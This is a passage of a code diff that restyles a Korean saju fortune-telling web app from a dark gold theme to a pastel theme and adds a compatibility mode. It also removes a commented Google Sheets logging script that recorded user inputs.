@@ -3,344 +3,489 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>AI 명리 에이전트 Pro</title>
-<link href="https://fonts.googleapis.com/css2?family=Nanum+Myeongjo:wght@400;700;800&family=Noto+Serif+KR:wght@300;400;600;700&display=swap" rel="stylesheet">
-<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
-
-<!--
-  ╔═══════════════════════════════════════════════════╗
-  ║          GOOGLE SHEETS 연동 설정 안내               ║
-  ╠═══════════════════════════════════════════════════╣
-  ║ 1. Google Sheets 문서 생성                          ║
-  ║ 2. 확장 프로그램 > Apps Script 클릭                  ║
-  ║ 3. 아래 코드를 붙여넣기 후 저장                       ║
-  ║ 4. 배포 > 새 배포 > 웹 앱 선택                       ║
-  ║ 5. 액세스: 모든 사용자 (익명) 설정                    ║
-  ║ 6. 배포 URL을 SHEETS_WEBHOOK_URL에 붙여넣기           ║
-  ╠═══════════════════════════════════════════════════╣
-  ║ Apps Script 코드:                                  ║
-  ║                                                   ║
-  ║ function doPost(e) {                               ║
-  ║   const ss = SpreadsheetApp.getActiveSpreadsheet();║
-  ║   const sheet = ss.getActiveSheet();               ║
-  ║   const d = JSON.parse(e.postData.contents);       ║
-  ║   if (!sheet.getLastRow()) {                       ║
-  ║     sheet.appendRow(['시각','이름','생년월일','시간', ║
-  ║       '성별','일주','질문내용','IP']);               ║
-  ║   }                                               ║
-  ║   sheet.appendRow([                                ║
-  ║     new Date().toLocaleString('ko-KR'),            ║
-  ║     d.name, d.birthDate, d.birthTime,              ║
-  ║     d.gender, d.dayPillar, d.question||'', d.ua    ║
-  ║   ]);                                              ║
-  ║   return ContentService                            ║
-  ║     .createTextOutput(JSON.stringify({ok:true}))   ║
-  ║     .setMimeType(ContentService.MimeType.JSON);    ║
-  ║ }                                                  ║
-  ╚═══════════════════════════════════════════════════╝
--->
-
+<title>사주당 🌸</title>
+<link href="https://fonts.googleapis.com/css2?family=Gowun+Dodum&family=Nanum+Myeongjo:wght@400;700;800&display=swap" rel="stylesheet">
 <style>
-:root {
-  --bg:     #0b0c18;
-  --bg2:    #11132a;
-  --bg3:    #181b35;
-  --card:   #1c2040;
-  --card2:  #222648;
-  --gold:   #c9a84c;
-  --gold2:  #e8c97a;
-  --goldf:  rgba(201,168,76,0.10);
-  --goldb:  rgba(201,168,76,0.25);
-  --text:   #eaebf8;
-  --text2:  #9ba3cc;
-  --text3:  #545a88;
-  --border: rgba(255,255,255,0.07);
-  --r:      16px;
-  --red:    #e06060;
-  --green:  #5abf85;
-  --blue:   #5e9cf5;
-  --purple: #9b7ce8;
+:root{
+  --bg:#fdf6f0;
+  --bg2:#fff8f4;
+  --card:#ffffff;
+  --peach:#ffb5a7;
+  --peach2:#fcd5ce;
+  --peach3:#fff0ec;
+  --rose:#e88080;
+  --lavender:#c8b6e2;
+  --lav2:#e8dff5;
+  --lav3:#f5f0ff;
+  --mint:#96d2c8;
+  --mint2:#d4f0ec;
+  --sky:#a8d8ea;
+  --gold:#d4956a;
+  --gold2:#f0b27a;
+  --text:#3d2c2c;
+  --text2:#7a5c5c;
+  --text3:#b08080;
+  --border:#f0d8d0;
+  --r:20px;
+  --r2:14px;
 }
 *{box-sizing:border-box;margin:0;padding:0}
 html{scroll-behavior:smooth}
-body{font-family:'Noto Serif KR',serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden}
-
-/* Background */
-body::before{
-  content:'';position:fixed;inset:0;
-  background:
-    radial-gradient(ellipse 60% 50% at 15% 10%, rgba(80,60,180,0.12) 0%,transparent 70%),
-    radial-gradient(ellipse 40% 40% at 85% 85%, rgba(201,168,76,0.07) 0%,transparent 60%);
-  pointer-events:none;z-index:0
-}
-body::after{
-  content:'';position:fixed;inset:0;
-  background-image:url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.015'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
-  pointer-events:none;z-index:0
+body{
+  font-family:'Gowun Dodum',sans-serif;
+  background:var(--bg);
+  color:var(--text);
+  min-height:100vh;
+  overflow-x:hidden;
 }
 
+/* 배경 꽃잎 파티클 */
+.petal{
+  position:fixed;font-size:18px;opacity:0;
+  animation:petalFall linear infinite;
+  pointer-events:none;z-index:0;
+}
+@keyframes petalFall{
+  0%{transform:translateY(-20px) rotate(0deg);opacity:.7}
+  100%{transform:translateY(110vh) rotate(360deg);opacity:0}
+}
+
+/* ── 헤더 ── */
 header{
   position:sticky;top:0;z-index:100;
-  background:rgba(11,12,24,0.9);
-  backdrop-filter:blur(24px);
+  background:rgba(253,246,240,.92);
+  backdrop-filter:blur(16px);
   border-bottom:1px solid var(--border);
 }
-.hdr{max-width:520px;margin:0 auto;padding:0 1rem;height:56px;display:flex;align-items:center;justify-content:space-between}
-.logo{display:flex;align-items:center;gap:10px}
-.logo-icon{width:34px;height:34px;border-radius:9px;background:linear-gradient(135deg,#c9a84c,#6b4fc8);display:flex;align-items:center;justify-content:center;font-size:17px}
-.logo-txt{font-family:'Nanum Myeongjo',serif;font-size:17px;font-weight:800;background:linear-gradient(90deg,var(--gold2),#a78fe8);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
-.hdr-right{display:flex;align-items:center;gap:8px}
-.reset-btn{display:none;font-size:11px;color:var(--text3);background:none;border:1px solid var(--border);border-radius:20px;cursor:pointer;padding:5px 12px;transition:all .2s;font-family:inherit}
-.reset-btn:hover{color:var(--gold);border-color:var(--goldb)}
+.hdr{max-width:540px;margin:0 auto;padding:0 1rem;height:52px;display:flex;align-items:center;justify-content:space-between}
+.logo{display:flex;align-items:center;gap:8px}
+.logo-emoji{font-size:22px}
+.logo-txt{font-family:'Nanum Myeongjo',serif;font-size:18px;font-weight:800;color:var(--rose)}
+.reset-btn{display:none;font-size:11px;color:var(--text3);background:var(--peach3);border:1px solid var(--peach2);border-radius:20px;cursor:pointer;padding:5px 13px;transition:all .2s;font-family:inherit}
+.reset-btn:hover{background:var(--peach2);color:var(--rose)}
 
-main{max-width:520px;margin:0 auto;padding:0 1rem 100px;position:relative;z-index:1}
+main{max-width:540px;margin:0 auto;padding:0 1rem 100px;position:relative;z-index:1}
 
-/* === INPUT === */
-.input-section{margin-top:22px}
-.hero{text-align:center;padding:28px 0 20px}
-.hero h2{font-family:'Nanum Myeongjo',serif;font-size:27px;font-weight:800;line-height:1.4}
-.hero p{color:var(--text3);font-size:13px;margin-top:8px}
-.gold{color:var(--gold)}
-
-.card{background:var(--card);border:1px solid var(--border);border-radius:var(--r);padding:20px;margin-bottom:12px}
-.card-title{font-size:12px;font-weight:700;color:var(--gold);letter-spacing:.8px;text-transform:uppercase;margin-bottom:16px;display:flex;align-items:center;gap:7px}
-label.fl{display:block;font-size:12px;color:var(--text2);margin-bottom:6px;font-weight:500}
-input[type=text],input[type=date],input[type=time],textarea,select{
-  width:100%;background:var(--bg3);border:1px solid var(--border);border-radius:11px;
-  color:var(--text);font-family:'Noto Serif KR',serif;font-size:15px;padding:11px 13px;
-  outline:none;transition:border-color .2s,box-shadow .2s;color-scheme:dark
-}
-input:focus,textarea:focus{border-color:var(--goldb);box-shadow:0 0 0 3px rgba(201,168,76,.07)}
-textarea{resize:none;min-height:75px;line-height:1.6}
-.g2{display:grid;grid-template-columns:1fr 1fr;gap:11px}
-.gender-grp{display:flex;gap:9px}
-.gr{display:none}
-.gl{flex:1;text-align:center;padding:10px;border-radius:11px;border:1px solid var(--border);background:var(--bg3);color:var(--text2);font-size:14px;cursor:pointer;transition:all .2s;font-family:inherit}
-.gr:checked+.gl{border-color:var(--gold);background:var(--goldf);color:var(--gold2);font-weight:600}
-
-.chips{display:flex;flex-wrap:wrap;gap:7px;margin-bottom:12px}
-.chip{font-size:12px;padding:5px 12px;border:1px solid var(--border);border-radius:20px;cursor:pointer;color:var(--text2);background:var(--bg3);transition:all .18s;font-family:inherit}
-.chip:hover,.chip.on{border-color:var(--gold);background:var(--goldf);color:var(--gold2)}
-
-.go-btn{
-  width:100%;padding:15px;
-  background:linear-gradient(135deg,#c9a84c,#8a6020);
-  color:#110900;font-family:'Nanum Myeongjo',serif;font-size:17px;font-weight:800;
-  border:none;border-radius:13px;cursor:pointer;transition:opacity .2s,transform .1s;
-  box-shadow:0 4px 24px rgba(201,168,76,.28);letter-spacing:.3px;margin-top:4px
-}
-.go-btn:hover{opacity:.9}.go-btn:active{transform:scale(.98)}
-
-/* === LOADING === */
-#loadingView{display:none;flex-direction:column;align-items:center;justify-content:center;padding:80px 20px;text-align:center}
-.ldr{width:56px;height:56px;border-radius:50%;border:2px solid var(--border);border-top-color:var(--gold);animation:spin 1s linear infinite;margin-bottom:20px}
+/* ── 홈 화면 — 모드 선택 ── */
+#homeSection{margin-top:16px}
+.home-hero{text-align:center;padding:28px 0 24px}
+.home-hero h2{font-family:'Nanum Myeongjo',serif;font-size:26px;font-weight:800;color:var(--rose);line-height:1.5}
+.home-hero p{color:var(--text3);font-size:13px;margin-top:6px}
+.sparkle{display:inline-block;animation:spin 3s linear infinite;font-size:20px}
 @keyframes spin{to{transform:rotate(360deg)}}
-.lt{color:var(--text2);font-size:14px;animation:pulse 1.5s ease-in-out infinite}
-@keyframes pulse{0%,100%{opacity:.5}50%{opacity:1}}
+
+.mode-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:16px}
+.mode-card{
+  background:var(--card);border:2px solid var(--border);border-radius:var(--r);
+  padding:22px 16px;text-align:center;cursor:pointer;transition:all .22s;
+  position:relative;overflow:hidden;
+}
+.mode-card::before{
+  content:'';position:absolute;inset:0;opacity:0;transition:opacity .2s;
+}
+.mode-card.saju::before{background:linear-gradient(135deg,var(--peach3),var(--lav3))}
+.mode-card.compat::before{background:linear-gradient(135deg,var(--mint2),var(--lav3))}
+.mode-card:hover{transform:translateY(-3px);border-color:var(--peach)}
+.mode-card:hover::before{opacity:1}
+.mode-card:hover .mc-icon{transform:scale(1.15)}
+.mc-icon{font-size:40px;display:block;margin-bottom:10px;transition:transform .2s;position:relative;z-index:1}
+.mc-title{font-family:'Nanum Myeongjo',serif;font-size:16px;font-weight:800;color:var(--text);margin-bottom:4px;position:relative;z-index:1}
+.mc-sub{font-size:11px;color:var(--text3);position:relative;z-index:1}
+.mc-badge{
+  display:inline-block;font-size:9px;padding:2px 8px;border-radius:20px;margin-top:6px;
+  font-weight:700;position:relative;z-index:1;
+}
+.badge-new{background:var(--peach);color:#fff}
+.badge-hot{background:var(--mint);color:#2a6058}
+
+/* ── 공통 카드 ── */
+.card{
+  background:var(--card);border:1.5px solid var(--border);border-radius:var(--r);
+  padding:18px;margin-bottom:12px;
+  box-shadow:0 2px 12px rgba(180,120,100,.06);
+}
+.card-title{
+  font-size:13px;font-weight:700;color:var(--rose);margin-bottom:14px;
+  display:flex;align-items:center;gap:7px;
+}
+.card-title span{font-size:16px}
+
+label.fl{display:block;font-size:12px;color:var(--text2);margin-bottom:5px;font-weight:600}
+input[type=text],input[type=date],input[type=time],textarea{
+  width:100%;background:var(--bg2);border:1.5px solid var(--border);border-radius:12px;
+  color:var(--text);font-family:'Gowun Dodum',sans-serif;font-size:14px;padding:10px 13px;
+  outline:none;transition:border-color .18s,box-shadow .18s;color-scheme:light;
+}
+input:focus,textarea:focus{border-color:var(--peach);box-shadow:0 0 0 3px rgba(255,181,167,.15)}
+textarea{resize:none;min-height:70px;line-height:1.6}
+.g2{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+
+.gender-grp{display:flex;gap:8px}
+.gr{display:none}
+.gl{
+  flex:1;text-align:center;padding:9px;border-radius:12px;
+  border:1.5px solid var(--border);background:var(--bg2);
+  color:var(--text2);font-size:13px;cursor:pointer;transition:all .2s;font-family:inherit;
+}
+.gr:checked+.gl{border-color:var(--peach);background:var(--peach3);color:var(--rose);font-weight:700}
+
+/* 칩 */
+.chips{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:10px}
+.chip{
+  font-size:11px;padding:5px 11px;border:1.5px solid var(--border);border-radius:20px;
+  cursor:pointer;color:var(--text2);background:var(--bg2);transition:all .18s;font-family:inherit;
+}
+.chip:hover,.chip.on{border-color:var(--peach);background:var(--peach3);color:var(--rose)}
+
+/* 시작 버튼 */
+.go-btn{
+  width:100%;padding:14px;
+  background:linear-gradient(135deg,var(--peach),var(--rose));
+  color:#fff;font-family:'Nanum Myeongjo',serif;font-size:17px;font-weight:800;
+  border:none;border-radius:14px;cursor:pointer;
+  box-shadow:0 4px 20px rgba(232,128,128,.35);
+  transition:opacity .2s,transform .1s;margin-top:4px;letter-spacing:.3px;
+}
+.go-btn:hover{opacity:.92}.go-btn:active{transform:scale(.98)}
+.go-btn.compat-btn{background:linear-gradient(135deg,var(--mint),#5aaea6)}
+
+/* 궁합 구분선 */
+.compat-divider{
+  display:flex;align-items:center;gap:12px;margin:16px 0 12px;color:var(--text3);font-size:12px;
+}
+.compat-divider::before,.compat-divider::after{content:'';flex:1;height:1px;background:var(--border)}
+
+/* ── 로딩 ── */
+#loadingView{
+  display:none;flex-direction:column;align-items:center;
+  justify-content:center;padding:80px 20px;text-align:center;
+}
+.ldr-wrap{position:relative;margin-bottom:20px}
+.ldr{
+  width:56px;height:56px;border-radius:50%;
+  border:3px solid var(--peach2);border-top-color:var(--rose);
+  animation:spin 1s linear infinite;
+}
+.ldr-emoji{
+  position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);
+  font-size:20px;animation:pulse 1.5s ease-in-out infinite;
+}
+@keyframes pulse{0%,100%{transform:translate(-50%,-50%) scale(.9)}50%{transform:translate(-50%,-50%) scale(1.1)}}
+.lt{color:var(--text2);font-size:14px}
 .ls{color:var(--text3);font-size:12px;margin-top:5px}
 
-/* === RESULT === */
+/* ── 결과 헤더 ── */
 #resultDashboard{display:none}
-.rhdr{text-align:center;padding:24px 0 0}
-.rname{font-family:'Nanum Myeongjo',serif;font-size:22px;font-weight:800}
-.rmeta{color:var(--text3);font-size:12px;margin-top:5px}
+.rhdr{text-align:center;padding:20px 0 4px}
+.rname{font-family:'Nanum Myeongjo',serif;font-size:22px;font-weight:800;color:var(--rose)}
+.rmeta{color:var(--text3);font-size:12px;margin-top:4px}
+.r-pill{
+  display:inline-flex;align-items:center;gap:4px;
+  font-size:11px;padding:3px 10px;border-radius:20px;margin:2px;font-weight:600;
+}
+.pill-p{background:var(--peach3);color:var(--rose);border:1px solid var(--peach2)}
+.pill-l{background:var(--lav3);color:#7a5abf;border:1px solid var(--lavender)}
 
-/* Tabs */
-.tabs{display:flex;gap:3px;background:var(--card);border-radius:13px;padding:4px;margin:18px 0 14px}
-.tb{flex:1;padding:8px 4px;border:none;background:none;border-radius:10px;color:var(--text3);font-size:11px;font-weight:600;cursor:pointer;transition:all .18s;font-family:inherit;line-height:1.3}
-.tb.on{background:var(--card2);color:var(--gold2)}
+/* ── 탭 ── */
+.tabs{
+  display:flex;gap:3px;background:var(--peach3);border-radius:14px;
+  padding:4px;margin:14px 0 12px;
+}
+.tb{
+  flex:1;padding:8px 3px;border:none;background:none;border-radius:11px;
+  color:var(--text3);font-size:10px;font-weight:700;cursor:pointer;
+  transition:all .18s;font-family:inherit;line-height:1.4;
+}
+.tb.on{background:var(--card);color:var(--rose);box-shadow:0 1px 6px rgba(200,100,80,.12)}
 .tp{display:none}.tp.on{display:block}
 
-/* === PILLARS TABLE === */
+/* ── 사주 팔자 표 ── */
 .pillars-wrap{overflow-x:auto;-webkit-overflow-scrolling:touch}
-.pillars-table{width:100%;border-collapse:separate;border-spacing:6px}
-.pillars-table th{font-size:11px;color:var(--text3);font-weight:500;padding:4px 0;text-align:center}
+.pillars-table{width:100%;border-collapse:separate;border-spacing:5px}
+.pillars-table th{font-size:10px;color:var(--text3);font-weight:600;padding:3px 0;text-align:center}
 .pcell{
-  text-align:center;border-radius:12px;padding:10px 4px 8px;cursor:default;
-  position:relative;transition:transform .15s
+  text-align:center;border-radius:14px;padding:10px 4px 8px;cursor:default;transition:transform .15s;
 }
-.pcell:hover{transform:scale(1.04)}
-.pcell .hanja{font-family:'Nanum Myeongjo',serif;font-size:28px;font-weight:700;display:block;line-height:1}
-.pcell .hangul{font-size:11px;color:rgba(255,255,255,.55);margin-top:3px;display:block;letter-spacing:.5px}
-.pcell.day-hl{box-shadow:0 0 0 2px var(--gold),0 0 16px rgba(201,168,76,.25)}
+.pcell:hover{transform:scale(1.05)}
+.pcell .hanja{font-family:'Nanum Myeongjo',serif;font-size:26px;font-weight:700;display:block;line-height:1}
+.pcell .hangul{font-size:10px;color:rgba(0,0,0,.38);margin-top:3px;display:block}
+.pcell.day-hl{box-shadow:0 0 0 2px var(--rose),0 0 14px rgba(232,128,128,.2)}
 .tengod{font-size:10px;padding:3px 0 0;display:block;color:var(--text3)}
-.tengod.me{color:var(--gold);font-weight:700}
+.tengod.me{color:var(--rose);font-weight:700}
 
-/* Element pill-pills */
-.ele-tag{display:inline-flex;align-items:center;gap:4px;font-size:10px;padding:2px 8px;border-radius:12px;font-weight:600;margin:2px}
-.ele-w{background:rgba(80,180,120,.15);color:#5abf85;border:1px solid rgba(80,180,120,.25)}
-.ele-f{background:rgba(220,90,90,.15);color:#e07070;border:1px solid rgba(220,90,90,.25)}
-.ele-e{background:rgba(200,160,50,.15);color:#d4a843;border:1px solid rgba(200,160,50,.25)}
-.ele-m{background:rgba(140,160,190,.15);color:#94a3b8;border:1px solid rgba(140,160,190,.25)}
-.ele-wa{background:rgba(80,140,240,.15);color:#60a5fa;border:1px solid rgba(80,140,240,.25)}
+/* 오행 색상 */
+.bg-w{background:linear-gradient(150deg,#c8f0d8,#e8faf0)}
+.bg-f{background:linear-gradient(150deg,#ffd0c8,#fff0ec)}
+.bg-e{background:linear-gradient(150deg,#f5e8b0,#fffae0)}
+.bg-m{background:linear-gradient(150deg,#d8e8f8,#eef5ff)}
+.bg-wa{background:linear-gradient(150deg,#c0d8f8,#e8f2ff)}
 
-/* Cell BGs by element */
-.bg-w{background:linear-gradient(160deg,#1e4a30,#0f2e1c)}
-.bg-f{background:linear-gradient(160deg,#5a1515,#3a0808)}
-.bg-e{background:linear-gradient(160deg,#5a4200,#3d2d00)}
-.bg-m{background:linear-gradient(160deg,#2a3547,#16202e)}
-.bg-wa{background:linear-gradient(160deg,#0f2a5a,#061536)}
-
-/* Element bar chart */
-.ebar{margin-bottom:9px}
-.ebar-hdr{display:flex;justify-content:space-between;font-size:12px;margin-bottom:4px}
-.ebar-track{height:5px;background:var(--bg3);border-radius:10px;overflow:hidden}
+/* 오행 바 */
+.ebar{margin-bottom:8px}
+.ebar-hdr{display:flex;justify-content:space-between;font-size:12px;margin-bottom:3px}
+.ebar-track{height:6px;background:var(--bg);border-radius:10px;overflow:hidden}
 .ebar-fill{height:100%;border-radius:10px;transition:width 1.2s cubic-bezier(.25,.46,.45,.94)}
-.bw{background:linear-gradient(90deg,#5abf85,#1e4a30)}
-.bf{background:linear-gradient(90deg,#e07070,#5a1515)}
-.be{background:linear-gradient(90deg,#d4a843,#5a4200)}
-.bm{background:linear-gradient(90deg,#94a3b8,#2a3547)}
-.bwa{background:linear-gradient(90deg,#60a5fa,#0f2a5a)}
+.bw{background:linear-gradient(90deg,#5abf85,#2a8a60)}
+.bf{background:linear-gradient(90deg,#e07070,#c04040)}
+.be{background:linear-gradient(90deg,#d4a843,#a07820)}
+.bm{background:linear-gradient(90deg,#7090c0,#4060a0)}
+.bwa{background:linear-gradient(90deg,#60a5fa,#2060c0)}
 
-/* Shinssal */
+/* 신살 배지 */
 .sal-badge{
-  display:inline-flex;align-items:center;gap:5px;
-  font-size:11px;padding:5px 11px;border-radius:20px;
-  cursor:pointer;margin:3px;transition:all .18s;font-weight:600;
-  border:1px solid transparent
+  display:inline-flex;align-items:center;gap:4px;font-size:11px;
+  padding:5px 11px;border-radius:20px;cursor:pointer;margin:3px;
+  transition:all .18s;font-weight:700;border:1.5px solid transparent;
 }
-.sal-gil{background:rgba(201,168,76,.12);color:var(--gold2);border-color:rgba(201,168,76,.3)}
-.sal-sal{background:rgba(220,90,90,.12);color:#e8807a;border-color:rgba(220,90,90,.3)}
-.sal-mix{background:rgba(140,160,240,.12);color:#a0b4f5;border-color:rgba(140,160,240,.3)}
+.sal-gil{background:var(--peach3);color:var(--rose);border-color:var(--peach2)}
+.sal-sal{background:#fff0f0;color:#c04040;border-color:#ffc0c0}
+.sal-mix{background:var(--lav3);color:#7a5abf;border-color:var(--lavender)}
+.sal-badge:hover{transform:scale(1.04)}
 
-/* Modal */
-.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:200;display:none;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(4px)}
-.modal-overlay.on{display:flex}
-.modal-box{background:var(--card);border:1px solid var(--border);border-radius:20px;padding:24px;max-width:360px;width:100%;animation:modalIn .25s ease}
-@keyframes modalIn{from{transform:scale(.92);opacity:0}to{transform:scale(1);opacity:1}}
-.modal-title{font-family:'Nanum Myeongjo',serif;font-size:18px;font-weight:800;margin-bottom:10px}
-.modal-close{float:right;background:none;border:none;color:var(--text3);font-size:20px;cursor:pointer;line-height:1}
-
-/* Daeun / Seun / Wolun */
+/* 대운·세운 */
 .daeun-scroll{overflow-x:auto;-webkit-overflow-scrolling:touch;padding-bottom:6px}
 .daeun-row{display:flex;gap:7px;min-width:max-content}
 .daeun-card{
-  width:90px;border-radius:13px;border:1px solid var(--border);
-  background:var(--bg3);padding:10px 7px;text-align:center;flex-shrink:0;
-  transition:all .2s;cursor:default
+  width:84px;border-radius:14px;border:1.5px solid var(--border);
+  background:var(--bg2);padding:9px 6px;text-align:center;flex-shrink:0;transition:all .2s;
 }
-.daeun-card.current{border-color:var(--gold);background:var(--goldf);box-shadow:0 0 12px rgba(201,168,76,.2)}
-.daeun-age{font-size:11px;color:var(--text3);margin-bottom:5px}
-.daeun-pillar{display:flex;gap:4px;justify-content:center;margin-bottom:5px}
-.dp-cell{width:34px;height:38px;border-radius:8px;display:flex;flex-direction:column;align-items:center;justify-content:center}
-.dp-hanja{font-family:'Nanum Myeongjo',serif;font-size:16px;font-weight:700}
-.dp-hangul{font-size:8px;color:rgba(255,255,255,.5);margin-top:1px}
+.daeun-card.current{border-color:var(--rose);background:var(--peach3);box-shadow:0 0 10px rgba(232,128,128,.18)}
+.daeun-age{font-size:10px;color:var(--text3);margin-bottom:4px}
+.daeun-pillar{display:flex;gap:3px;justify-content:center;margin-bottom:4px}
+.dp-cell{width:30px;height:34px;border-radius:8px;display:flex;flex-direction:column;align-items:center;justify-content:center}
+.dp-hanja{font-family:'Nanum Myeongjo',serif;font-size:14px;font-weight:700}
+.dp-hangul{font-size:7px;color:rgba(0,0,0,.35);margin-top:1px}
 
-.seun-grid{display:grid;grid-template-columns:repeat(5,1fr);gap:6px}
-.seun-card{border-radius:11px;border:1px solid var(--border);background:var(--bg3);padding:8px 4px;text-align:center}
-.seun-card.cur{border-color:var(--gold);background:var(--goldf)}
-.seun-year{font-size:10px;color:var(--text3);margin-bottom:4px}
+.seun-grid{display:grid;grid-template-columns:repeat(5,1fr);gap:5px}
+.seun-card{border-radius:11px;border:1.5px solid var(--border);background:var(--bg2);padding:7px 3px;text-align:center}
+.seun-card.cur{border-color:var(--rose);background:var(--peach3)}
+.seun-year{font-size:9px;color:var(--text3);margin-bottom:3px}
 
 .wolun-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:5px}
-.wolun-card{border-radius:10px;border:1px solid var(--border);background:var(--bg3);padding:7px 4px;text-align:center}
-.month-label{font-size:9px;color:var(--text3);margin-bottom:3px}
+.wolun-card{border-radius:10px;border:1.5px solid var(--border);background:var(--bg2);padding:6px 3px;text-align:center}
+.month-label{font-size:9px;color:var(--text3);margin-bottom:2px}
 
-/* AI Cards */
-.ai-card{background:var(--card);border:1px solid var(--border);border-radius:var(--r);padding:18px;margin-bottom:11px;border-left:3px solid var(--gold);opacity:0;transform:translateY(12px);animation:sup .5s ease forwards}
+/* AI 카드 */
+.ai-card{
+  background:var(--card);border:1.5px solid var(--border);border-radius:var(--r);
+  padding:16px;margin-bottom:10px;border-left:3px solid var(--peach);
+  opacity:0;transform:translateY(10px);animation:sup .45s ease forwards;
+}
 @keyframes sup{to{opacity:1;transform:translateY(0)}}
-.ai-card-title{font-size:14px;font-weight:700;color:var(--gold2);margin-bottom:9px;display:flex;align-items:center;gap:7px}
-.ai-card p{font-size:13px;color:var(--text2);line-height:1.8;word-break:keep-all}
-.ai-card strong{color:var(--text);font-weight:600}
+.ai-card-title{font-size:14px;font-weight:700;color:var(--rose);margin-bottom:8px;display:flex;align-items:center;gap:6px}
+.ai-card p{font-size:13px;color:var(--text2);line-height:1.85;word-break:keep-all}
+.ai-card strong{color:var(--text);font-weight:700}
 
 /* Q&A */
 .ask-btn{
-  width:100%;padding:12px;
-  background:var(--card2);border:1px solid var(--goldb);border-radius:12px;
-  color:var(--gold);font-family:inherit;font-size:14px;font-weight:600;
-  cursor:pointer;margin-top:10px;transition:all .2s
+  width:100%;padding:11px;background:var(--peach3);
+  border:1.5px solid var(--peach2);border-radius:12px;
+  color:var(--rose);font-family:inherit;font-size:13px;font-weight:700;
+  cursor:pointer;margin-top:10px;transition:all .2s;
 }
-.ask-btn:hover{background:var(--goldf)}.ask-btn:disabled{opacity:.4;cursor:not-allowed}
-.q-bubble{background:var(--card2);border:1px solid var(--border);border-radius:12px 12px 4px 12px;padding:11px 14px;margin-bottom:9px;font-size:13px;color:var(--text2);text-align:right;word-break:keep-all}
-.q-label{color:var(--text3);font-size:10px;display:block;margin-bottom:4px}
-
-/* ★ 핵심 수정: a-bubble를 flex 컨테이너로 만들어 내용이 잘리지 않도록 함 */
+.ask-btn:hover{background:var(--peach2)}.ask-btn:disabled{opacity:.4;cursor:not-allowed}
+.q-bubble{
+  background:linear-gradient(135deg,var(--peach3),var(--lav3));
+  border:1px solid var(--peach2);border-radius:14px 14px 4px 14px;
+  padding:11px 14px;margin-bottom:8px;font-size:13px;color:var(--text2);
+  text-align:right;word-break:keep-all;
+}
+.q-label{color:var(--rose);font-size:10px;display:block;margin-bottom:4px;font-weight:700}
 .a-bubble{
-  background:var(--bg3);border:1px solid var(--border);
-  border-radius:4px 12px 12px 12px;padding:14px;margin-bottom:12px;
+  background:var(--card);border:1.5px solid var(--border);
+  border-radius:4px 14px 14px 14px;padding:14px;margin-bottom:12px;
   font-size:13px;color:var(--text2);line-height:1.85;word-break:keep-all;
-  white-space:pre-wrap; /* 줄바꿈 보존 */
-  overflow-wrap:break-word; /* 긴 단어 강제 줄바꿈 */
-  width:100%; /* 너비 명시 */
+  white-space:pre-wrap;overflow-wrap:break-word;width:100%;
 }
-.a-label{color:var(--gold);font-size:10px;display:block;margin-bottom:6px}
+.a-label{color:var(--rose);font-size:10px;display:block;margin-bottom:6px;font-weight:700}
 
-/* 로딩 인디케이터 (타이핑 점) */
+/* 로딩 점 */
 .typing-dots{display:inline-flex;gap:4px;align-items:center;padding:2px 0}
-.typing-dots span{
-  width:6px;height:6px;border-radius:50%;background:var(--gold);
-  animation:tdot 1.2s ease-in-out infinite;
-}
+.typing-dots span{width:6px;height:6px;border-radius:50%;background:var(--peach);animation:tdot 1.2s ease-in-out infinite}
 .typing-dots span:nth-child(2){animation-delay:.2s}
 .typing-dots span:nth-child(3){animation-delay:.4s}
 @keyframes tdot{0%,80%,100%{opacity:.2;transform:scale(.8)}40%{opacity:1;transform:scale(1)}}
 
-/* Section label */
-.sec-lbl{font-size:12px;font-weight:700;color:var(--gold);letter-spacing:.6px;text-transform:uppercase;margin-bottom:10px;display:flex;align-items:center;gap:6px}
+/* ── 궁합 결과 ── */
+.compat-result{background:var(--card);border:1.5px solid var(--border);border-radius:var(--r);padding:20px;margin-bottom:12px}
+.compat-persons{display:flex;align-items:center;justify-content:center;gap:12px;margin-bottom:16px}
+.cp-box{text-align:center}
+.cp-name{font-family:'Nanum Myeongjo',serif;font-size:15px;font-weight:800;color:var(--text)}
+.cp-pillar{font-size:11px;color:var(--text3);margin-top:3px}
+.cp-heart{font-size:28px;animation:heartbeat .8s ease-in-out infinite}
+@keyframes heartbeat{0%,100%{transform:scale(1)}50%{transform:scale(1.18)}}
+
+/* 궁합 점수 게이지 */
+.score-wrap{text-align:center;margin:12px 0 16px}
+.score-num{font-family:'Nanum Myeongjo',serif;font-size:48px;font-weight:800;color:var(--rose);line-height:1}
+.score-label{font-size:12px;color:var(--text3);margin-top:4px}
+.score-bar-wrap{background:var(--bg);border-radius:20px;height:10px;margin:10px 0;overflow:hidden}
+.score-bar{height:100%;border-radius:20px;transition:width 1.5s cubic-bezier(.25,.46,.45,.94)}
+
+.compat-section{margin-bottom:14px}
+.compat-section-title{font-size:12px;font-weight:700;color:var(--rose);margin-bottom:8px;display:flex;align-items:center;gap:5px}
+.compat-tag{display:inline-flex;align-items:center;gap:4px;font-size:11px;padding:4px 10px;border-radius:14px;margin:2px;font-weight:600}
+.tag-good{background:var(--mint2);color:#2a8060}
+.tag-bad{background:#ffe0e0;color:#c04040}
+.tag-mid{background:var(--lav3);color:#7a5abf}
+
+/* 설명 행 */
+.explain-row{padding:9px 0;border-bottom:1px solid var(--border);display:flex;gap:10px;align-items:flex-start}
